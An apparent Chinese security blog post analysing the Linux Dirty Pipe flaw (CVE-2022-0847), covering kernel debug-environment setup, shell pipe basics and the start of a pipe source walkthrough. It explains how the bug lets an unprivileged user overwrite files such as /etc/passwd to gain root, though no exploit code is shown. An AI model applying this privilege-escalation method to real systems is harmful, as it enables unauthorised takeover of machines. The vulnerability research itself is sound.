<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="fa1lr4in">
    
    <title>
        
            CVE-2022-0847 dirtypipe linux本地提权全网第二详细漏洞分析 |
        
        fa1lr4in&#39;s blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="/images/logo.svg">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/css/font-awesome.min.css">
    <script id="hexo-configurations">
    let KEEP = window.KEEP || {};
    KEEP.hexo_config = {"hostname":"fa1lr4in.github.io","root":"/","language":"en","path":"search.json"};
    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.svg","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"男儿何不带吴钩，收取关山五十州。"},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.5"};
    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
  </script>
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
</head>


<body>
<div class="progress-bar-container">
    

    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            <header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
            <a class="logo-title" href="/">
                fa1lr4in&#39;s blog
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                HOME
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                ARCHIVES
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/categories"
                            >
                                CATEGORIES
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/tags"
                            >
                                TAGS
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/about"
                            >
                                ABOUT
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">HOME</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">ARCHIVES</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories">CATEGORIES</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/tags">TAGS</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/about">ABOUT</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="article-content-container">

        <div class="article-title">
            <span class="title-hover-animation">CVE-2022-0847 dirtypipe linux本地提权全网第二详细漏洞分析</span>
        </div>

        
            <div class="article-header">
                <div class="avatar">
                    <img src="/images/avatar.svg">
                </div>
                <div class="info">
                    <div class="author">
                        <span class="name">fa1lr4in</span>
                        
                            <span class="author-label">Lv2</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fas fa-edit"></i>&nbsp;
        <span class="pc">2022-03-30 11:46:57</span>
        <span class="mobile">2022-03-30 11:46</span>
    </span>
    
        <span class="article-categories article-meta-item">
            <i class="fas fa-folder"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>&nbsp;
                    </li>
                
                    <li>
                        | <a href="/tags/linux/">linux</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fas fa-file-word"></i>&nbsp;<span>18.9k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fas fa-clock"></i>&nbsp;<span>83 Mins</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        <div class="article-content markdown-body">
            <h1 id="CVE-2022-0847-dirtypipe-linux本地提权全网第二详细漏洞分析"><a href="#CVE-2022-0847-dirtypipe-linux本地提权全网第二详细漏洞分析" class="headerlink" title="CVE-2022-0847 dirtypipe linux本地提权全网第二详细漏洞分析"></a>CVE-2022-0847 dirtypipe linux本地提权全网第二详细漏洞分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CVE-2022-0847 于 2022-03-07 公开披露，该漏洞的大概原理为<code>splice</code>系统调用由于未初始化某buf，可能包含旧的<code>PIPE_BUF_FLAG_CAN_MERGE</code>，导致可以通过管道越界写，覆盖关键文件如<code>/etc/passwd</code>可达到提权的效果。因漏洞类型和“DirtyCow”（脏牛）类似，发现者 Max Kellermann 研究员将该漏洞命名为 Dirty Pipe</p>
<p>从漏洞作者的博客可以得知，作者并非从事于漏洞挖掘相关的工作，而是由于关注到了日志文件的CRC校验和与文件大小标志位出现了错误。大小正好为8个字节，作者经过长时间的排查验证发现这八个字节为ZIP头。</p>
<p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220315174946244.png" alt="image-20220315174946244"></p>
<p>经过<code>检查zlib及项目相关库</code>-&gt;<code>发现bug出现在月末</code>-&gt;<code>审查web代码</code>-&gt;<code>定位linux内核代码</code>这一套复杂的流程发现了linux pipe存在安全隐患，最终编写出利用代码并提交给社区。这种精神是安全研究者必备的品质。respect！</p>
<p>参考了国内的师傅们所公开的分析文章，大概了解漏洞原理后，开始正式分析。</p>
<p>前置知识非必须，实力较强的师傅可以直接看漏洞分析部分。</p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="一、linux内核调试环境编译"><a href="#一、linux内核调试环境编译" class="headerlink" title="一、linux内核调试环境编译"></a>一、linux内核调试环境编译</h3><p>主要参考了<a class="link"   target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1643968" >该文章<i class="fas fa-external-link-alt"></i></a>与<a class="link"   target="_blank" rel="noopener" href="https://www.binss.me/blog/how-to-debug-linux-kernel/" >该文章<i class="fas fa-external-link-alt"></i></a>，我使用了5.11.1版本的linux</p>
<h4 id="1、源码获取"><a href="#1、源码获取" class="headerlink" title="1、源码获取"></a>1、源码获取</h4><p>首先拖源码（这里也可以下载其他版本）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.11.1.tar.gz</span><br><span class="line">tar zxvf linux-5.11.1.tar.gz</span><br></pre></td></tr></table></figure>

<p>或者使用官方github</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/torvalds/linux.git</span><br><span class="line">git checkout xxxx</span><br></pre></td></tr></table></figure>

<p>我采用的是第一种方式</p>
<h4 id="2、内核编译"><a href="#2、内核编译" class="headerlink" title="2、内核编译"></a>2、内核编译</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> linux-5.11.1</span><br><span class="line">make x86_64_defconfig		   <span class="comment"># 加载默认config</span></span><br><span class="line">make menuconfig		<span class="comment"># 自定义config</span></span><br></pre></td></tr></table></figure>

<p>要进行打断点调试，需要关闭系统的随机化和开启调试信息：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Processor type and features  ---&gt; </span><br><span class="line">    [ ] Build a relocatable kernel                                               </span><br><span class="line">        [ ]  Randomize the address <span class="keyword">of</span> the kernel image (KASLR) (NEW) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Kernel hacking  ---&gt;</span><br><span class="line">    Compile-time checks and compiler options  ---&gt;  </span><br><span class="line">        [*] Compile the kernel <span class="keyword">with</span> debug info                                                                  </span><br><span class="line">        [ ]   Reduce debugging information                                                                      </span><br><span class="line">        [ ]   Produce split debuginfo <span class="keyword">in</span> .dwo files                                                             </span><br><span class="line">        [*]   Generate dwarf4 debuginfo                                         </span><br><span class="line">        [*]   Provide GDB scripts <span class="keyword">for</span> kernel debugging</span><br></pre></td></tr></table></figure>

<p>之后进行编译</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -j8</span><br></pre></td></tr></table></figure>



<h4 id="3、加载文件系统镜像"><a href="#3、加载文件系统镜像" class="headerlink" title="3、加载文件系统镜像"></a>3、加载文件系统镜像</h4><p>这里可以使用<code>syzkaller</code>的生成脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> linux-5.11.1</span><br><span class="line">sudo apt-get install debootstrap</span><br><span class="line">wget https://github.com/google/syzkaller/blob/master/tools/create-image.sh -O create-image.sh	<span class="comment"># 这里我得到的是一个html页面，最终笔者自行访问页面复制了相关的代码。</span></span><br><span class="line">chmod +x create-image.sh</span><br><span class="line">./create-image.sh				<span class="comment"># 这里会在当前目录生成 stretch.img</span></span><br></pre></td></tr></table></figure>



<h4 id="4、启动qemu"><a href="#4、启动qemu" class="headerlink" title="4、启动qemu"></a>4、启动qemu</h4><p>这里的<code>-nographic</code>以及<code>-s</code>一定要加，执行命令后会启动生成的linux系统，并得到一个shell，这里可以不指定-net参数，默认会有一个NAT的网络，可以访问外网。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> linux-5.11.1</span><br><span class="line">sudo qemu-system-x86_64 \</span><br><span class="line">	-s \</span><br><span class="line">    -m 2G \</span><br><span class="line">    -smp 2 \</span><br><span class="line">    -kernel ./arch/x86/boot/bzImage \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 root=/dev/sda earlyprintk=serial&quot;</span>\</span><br><span class="line">    -drive file=./stretch.img,format=raw \</span><br><span class="line">    -nographic \</span><br><span class="line">    -pidfile vm.pid \</span><br><span class="line">    2&gt;&amp;1 | tee vm.log</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220316173537546.png" alt="image-20220316173537546"></p>
<p>命令行参数如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-s              shorthand <span class="keyword">for</span> -gdb tcp::1234</span><br><span class="line">-append cmdline use <span class="string">&#x27;cmdline&#x27;</span> as kernel <span class="built_in">command</span> line</span><br><span class="line">-net nic[,macaddr=mac][,model=<span class="built_in">type</span>][,name=str][,addr=str][,vectors=v]</span><br><span class="line">                configure or create an on-board (or machine default) NIC and</span><br><span class="line">                connect it to hub 0 (please use -nic unless you need a hub) </span><br><span class="line">-enable-kvm 开启kvm，这里不要加，否则调试时会直接跳转到__sysvec_apic_timer_interrupt</span><br></pre></td></tr></table></figure>



<h4 id="5、gdb调试"><a href="#5、gdb调试" class="headerlink" title="5、gdb调试"></a>5、gdb调试</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> linux-5.11.1</span><br><span class="line">gdb vmlinux</span><br><span class="line">gef➤  target remote:1234		<span class="comment"># 连接到远程调试接口</span></span><br><span class="line"><span class="comment"># 后面就可以正常进行调试了</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220316174104667.png" alt="image-20220316174104667"></p>
<h3 id="二、标准输入输出、输入输出重定向、管道"><a href="#二、标准输入输出、输入输出重定向、管道" class="headerlink" title="二、标准输入输出、输入输出重定向、管道"></a>二、标准输入输出、输入输出重定向、管道</h3><h4 id="1、标准输入输出"><a href="#1、标准输入输出" class="headerlink" title="1、标准输入输出"></a>1、标准输入输出</h4><p>执行一个shell命令行时通常会自动打开三个标准文件，即标准输入文件<code>stdin</code>，通常对应终端的键盘；标准输出文件<code>stdout</code>和标准错误输出文件<code>stderr</code>，这两个文件都对应终端的屏幕。进程将从标准输入文件中得到输入数据，将正常输出数据输出]到标准输出文件，而将错误信息送到标准错误文件中。</p>
<p>举两个栗子</p>
<p>这里的文件描述符要注意里面的信息流</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test1.c	将AAAAA送入标准输出，标准输出通过管道传递给wc命令得到字符数</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">write</span>(<span class="number">1</span>,<span class="string">&quot;AAAAA&quot;</span>,<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ./test1</span></span><br><span class="line">AAAAA</span><br><span class="line"><span class="comment">// ./test1 | wc -c</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// test2.c 将AAAAA送入标准输入，wc -c没有从标准输出得到输入</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">write</span>(<span class="number">0</span>,<span class="string">&quot;AAAAA&quot;</span>,<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ./test1</span></span><br><span class="line">AAAAA</span><br><span class="line"><span class="comment">// ./test1 | wc -c</span></span><br><span class="line">AAAAA0</span><br></pre></td></tr></table></figure>



<h4 id="2、输入输出重定向"><a href="#2、输入输出重定向" class="headerlink" title="2、输入输出重定向"></a>2、输入输出重定向</h4><p><strong>输入重定向</strong>是指把命令（或可执行程序）的标准输入重定向到指定的文件中。也就是说，输入可以不来自键盘，而来自一个指定的文件。</p>
<p>如果给出一个文件名作为wc命令的参数，如下例所示，wc将返回该文件所包含的行数、单词数和字符数。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># wc /etc/passwd</span></span><br><span class="line">  50   87 2933 /etc/passwd</span><br></pre></td></tr></table></figure>

<p>另一种把/etc/passwd文件内容传给wc命令的方法是重定向wc的输入。输入重定向的一般形式为：命令&lt;文件名。可以用下面的命令把wc命令的输入重定向为/etc/passwd文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># wc &lt; /etc/passwd</span></span><br><span class="line">  50   87 2933</span><br></pre></td></tr></table></figure>

<p>另一种输入重定向称为here文档，它告诉shell当前命令的标准输入来自命令行。here文档的重定向操作符使用&lt;&lt;。它将一对分隔符（本例中用delim表示）之间的正文重定向输入给命令。下例将一对分隔符delim之间的正文作为wc命令的输入，统计出正文的行数、单词数和字符数。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># wc &lt;&lt; delim</span></span><br><span class="line">\&gt;this text forms the content</span><br><span class="line">\&gt;of the here document,<span class="built_in">which</span></span><br><span class="line">\&gt;continues until the end of</span><br><span class="line">\&gt;text delimter</span><br><span class="line">\&gt;delim</span><br><span class="line"></span><br><span class="line">4 17 98</span><br></pre></td></tr></table></figure>

<p><strong>输出重定向</strong>是指把命令（或可执行程序）的标准输出或标准错误输出重新定向到指定文件中。这样，该命令的输出就不显示在屏幕上，而是写入到指定文件中。</p>
<p>输出重定向比输入重定向更常用，很多情况下都可以使用这种功能。例如，如果某个命令的输出很多，在屏幕上不能完全显示，那么将输出重定向到一个文件中，然后再用文本编辑器打开这个文件，就可以查看输出信息；如果想保存一个命令的输出，也可以使用这种方法。</p>
<p>输出重定向的一般形式为：命令&gt;文件名。例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls &gt; out</span><br></pre></td></tr></table></figure>

<p>这里将ls命令的输出写入到out文件中，注意这里的写入是覆盖写入，如果想得到追加写入的效果，可以使用<code>&lt;&lt;</code>.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls &gt;&gt; out</span><br></pre></td></tr></table></figure>

<p>和程序的标准输出重定向一样，程序的错误输出也可以重新定向。使用符号2&gt;（或追加符号2&gt;&gt;）表示对错误输出设备重定向。例如下面的命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls 2&gt; error</span><br><span class="line">ls 2&gt;&gt; error</span><br></pre></td></tr></table></figure>

<p>可在屏幕上看到程序的正常输出结果，但又将程序的任何错误信息送到文件err.file中，以备将来检查用。</p>
<p>还可以使用另一个输出重定向操作符（&amp;&gt;）将标准输出和错误输出同时送到同一文件中。例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls &amp;&gt; error</span><br></pre></td></tr></table></figure>

<p>利用重定向将命令组合在一起，可实现系统单个命令不能提供的新功能。例如使用下面的命令序列：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ls /usr/bin &gt; /tmp/dir</span></span><br><span class="line"><span class="comment"># wc -w &lt; /tmp/dir</span></span><br><span class="line">459</span><br></pre></td></tr></table></figure>

<p>统计了/usr/bin目录下的文件个数。</p>
<h4 id="3、管道"><a href="#3、管道" class="headerlink" title="3、管道"></a>3、管道</h4><p>将一个程序或命令的输出作为另一个程序或命令的输入，有两种方法，一种是通过一个临时文件将两个命令或程序结合在一起，例如上个例子中的/tmp/dir文件将ls和wc命令联在一起；另一种是Linux所提供的管道功能。这种方法比前一种方法更好。</p>
<p>管道可以把一系列命令连接起来，这意味着第一个命令的输出会作为第二个命令的输入通过管道传给第二个命令，第二个命令的输出又会作为第三个命令的输入，以此类推。显示在屏幕上的是管道行中最后一个命令的输出（如果命令行中未使用输出重定向）。</p>
<p>通过使用管道符“|”来建立一个管道行。用管道重写上面的例子：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ls /usr/bin|wc -w</span></span><br><span class="line">1789</span><br></pre></td></tr></table></figure>

<p>管道与重定向的简单区别在于，重定向将命令与文件连接起来，而管道符将命令与命令连接起来。</p>
<p><strong>管道是进程间通信的主要手段之一。一个管道实际上就是个只存在于内存中的文件，</strong></p>
<p><strong>对这个文件的操作要通过两个已经打开文件进行，它们分别代表管道的两端。管道是一种特殊的文件，它不属于某一种文件系统，而是一种独立的文件系统，有其自己的数据结构。根据管道的适用范围将其分为：无名管道和命名管道。</strong></p>
<p>管道是由内核管理的一个缓冲区，相当于我们放入内存中的一个纸条。管道的一端连接一个进程的输出。这个进程会向管道中放入信息。管道的另一端连接一个进程的输入，这个进程取出被放入管道的信息。一个缓冲区不需要很大一般为4K大小，它被设计成为环形的数据结构，以便管道可以被循环利用。当管道中没有信息的话，从管道中读取的进程会等待，直到另一端的进程放入信息。当管道被放满信息的时候，尝试放入信息的进程会等待，直到另一端的进程取出信息。当两个进程都终结的时候，管道也自动消失。</p>
<h3 id="三、管道源代码实现"><a href="#三、管道源代码实现" class="headerlink" title="三、管道源代码实现"></a>三、管道源代码实现</h3><h4 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h4><p>代码部分使用了linux v5.11.1内核代码，也尝试对比了下linux0.12内核的源代码，发现内部的结构体与代码逻辑已完全不同，0.12使用了名叫<code>m_inode</code>的结构体，而5.11.1则使用了<code>pipe_inode_info</code>的结构体，光pipe.c文件的体量，linux0.12为128行，而5.11.1为1431行，差了11倍的代码量，综合多方面考虑，linux0.12的代码对于现在linux内核运作的理解并不具备太大的参考价值。</p>
<p>代码有一部分的变量值是我通过poc实时得出的，并不适用于所有情况。</p>
<p>下面的代码分析章节编写顺序是按照调用关系来写的（比如函数A调用了函数B，编写时先写A再写B），然而分析顺序与编写顺序恰好相反（也就是先分析B再分析A），原因是在源码分析时，很明显要线分析最内层的函数，这样才能更好理解外层函数的作用，所以有些代码分析大家可能不能理解，往下看就好了。</p>
<p>笔者先将整体的流程图贴出来，方便师傅们对函数调用流程有个整体的把握。</p>
<p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220322160826347.png" alt="image-20220322160826347"></p>
<p>创建pipe的流程首先创建两个整数类型的文件描述符</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> fd[<span class="number">2</span>];</span><br></pre></td></tr></table></figure>

<p>之后利用pipe函数传入文件描述符即可打开管道，其中fd[0]为读管道的文件描述符，fd[1]为写管道的文件描述符。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> err = <span class="built_in">pipe</span>(fd); </span><br></pre></td></tr></table></figure>

<p>一个简单的demo如下，代码主要的逻辑是：首先创建一个管道，之后通过<code>write</code>函数操作<code>fd[1]</code>向管道写入了数据，之后通过<code>read</code>函数操作<code>fd[0]</code>从管道读出数据到标准输出。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">pid_t</span> pid;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> fd[<span class="number">2</span>];<span class="comment">//定义管道的读、写端文件描述符</span></span><br><span class="line">        <span class="keyword">int</span> len, err;</span><br><span class="line">        <span class="keyword">char</span>* str = <span class="string">&quot;hello pipe\n&quot;</span>;<span class="comment">//指定写数据</span></span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">1024</span>];<span class="comment">//定义接收缓冲区</span></span><br><span class="line"></span><br><span class="line">        err = pipe(fd);<span class="comment">//调用pipe()函数就已将管道打开</span></span><br><span class="line">        <span class="keyword">if</span>(err == <span class="number">-1</span>) &#123;</span><br><span class="line">                perror(<span class="string">&quot;pipe error&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        pid = fork();</span><br><span class="line">        <span class="keyword">if</span>(pid &gt; <span class="number">0</span>)<span class="comment">/* 父进程 */</span> &#123;</span><br><span class="line">                close(fd[<span class="number">0</span>]);</span><br><span class="line">                write(fd[<span class="number">1</span>],str,<span class="built_in">strlen</span>(str));<span class="comment">//写到管道中</span></span><br><span class="line">                close(fd[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)<span class="comment">/* 子进程 */</span> &#123;</span><br><span class="line">                close(fd[<span class="number">1</span>]);</span><br><span class="line">                len = read(fd[<span class="number">0</span>],buf,<span class="keyword">sizeof</span>(buf));<span class="comment">//从管道中的读，返回读到的字节数</span></span><br><span class="line">                write(STDOUT_FILENO,buf,len);<span class="comment">//写到标准输出</span></span><br><span class="line">                close(fd[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="1、pipe-与-pipe2"><a href="#1、pipe-与-pipe2" class="headerlink" title="1、pipe() 与 pipe2()"></a>1、pipe() 与 pipe2()</h4><p>创建 pipe 的系统调用有两个：<code>pipe()</code> 和 <code>pipe2()</code>，实现<a class="link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.10/source/fs/pipe.c#L1008%EF%BC%89" >如下<i class="fas fa-external-link-alt"></i></a>，二者均调用了<code>do_pipe2</code><a class="link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.10/source/fs/pipe.c#L986%EF%BC%89" >函数<i class="fas fa-external-link-alt"></i></a>，</p>
